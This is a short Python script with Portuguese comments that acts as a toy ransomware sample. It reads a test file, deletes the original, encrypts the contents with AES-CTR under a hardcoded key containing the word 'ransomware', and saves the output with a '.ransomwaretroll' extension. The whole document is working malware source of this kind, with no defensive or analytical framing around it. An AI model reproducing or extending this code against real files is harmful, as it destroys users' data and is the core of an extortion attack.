import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = "teste.txt"
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"
with open(new_file_name, "wb") as new_file:
    new_file.write(crypto_data)

print(f"Arquivo {new_file_name} criado com sucesso.")
